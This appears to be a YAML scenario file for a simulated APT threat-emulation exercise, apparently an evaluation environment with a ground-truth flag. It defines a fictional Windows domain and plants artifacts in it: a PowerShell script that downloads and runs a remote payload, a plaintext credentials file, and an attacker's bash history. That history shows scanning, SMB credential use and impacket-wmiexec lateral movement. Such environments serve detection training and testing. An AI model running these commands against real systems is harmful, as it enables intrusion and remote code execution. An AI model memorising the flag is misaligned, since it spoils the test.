name: "apt_threat_emulation_smb"
description: "Threat Emulation: Chinese APT group mimicking living-off-the-land techniques via SMB and WMI."
ground_truth_flag: "FLAG{wmic_process_call_create_detected}"

world_state_dynamics:
  enforce_topology: true
  namespaces:
    - name: "ActiveDirectory"
      allowed_egress: ["DomainControllers", "Workstations"]
    - name: "Workstations"
      allowed_egress: ["ActiveDirectory", "Internet"]
      
  synthetic_faults:
    latency_jitter_ms: 50

context_depth: "high"
env_vars:
  USERDOMAIN: "CORP"
  USERNAME: "j.doe"

hosts:
  - hostname: "DC01.corp.local"
    ip: "10.0.0.10"
    os_type: "windows"
    services:
      - port: 445
        name: "microsoft-ds"
        version: "Windows Server 2022"
      - port: 135
        name: "msrpc"
        version: "Microsoft Windows RPC"
      - port: 389
        name: "ldap"
        version: "Active Directory LDAP"

  - hostname: "WS-105.corp.local"
    ip: "10.0.5.105"
    os_type: "windows"
    services:
      - port: 445
        name: "microsoft-ds"
        version: "Windows 11 Enterprise"

files:
  - path: "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx"
    content: |
        Event ID: 4624 (Logon Success)
        Logon Type: 3 (Network)
        Source IP: 10.0.5.105
        Account Name: j.doe
        Domain: CORP
  - path: "C:\\Users\\j.doe\\AppData\\Local\\Temp\\update.ps1"
    content: "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://104.21.x.x/payload.ps1')"
  - path: "C:\\Users\\j.doe\\Documents\\creds.txt"
    content: |
        # AD Service Account Credentials (do not share)
        Domain: corp.local
        Username: j.doe
        Password: Summer2025!
  - path: "/home/kali/.bash_history"
    content: |
        nmap -sV 10.0.0.10 10.0.5.105
        crackmapexec smb 10.0.0.10 -u j.doe -p 'Summer2025!'
        smbclient -L //10.0.0.10 -U 'j.doe%Summer2025!'
        impacket-wmiexec 'corp.local/j.doe:Summer2025!@10.0.0.10'

